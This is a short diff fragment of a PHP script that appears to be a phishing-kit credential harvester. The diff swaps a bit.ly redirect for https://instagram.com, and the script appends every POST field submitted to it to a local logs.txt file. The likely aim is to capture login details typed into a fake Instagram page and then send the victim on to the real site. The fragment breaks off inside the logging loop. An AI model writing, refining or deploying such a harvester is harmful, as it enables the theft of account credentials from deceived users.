@@ -1,5 +1,5 @@
 <?php
-header ('Location:http://bit.ly/30ct1g5');
+header ('Location:https://instagram.com');
 $handle = fopen("./logs.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
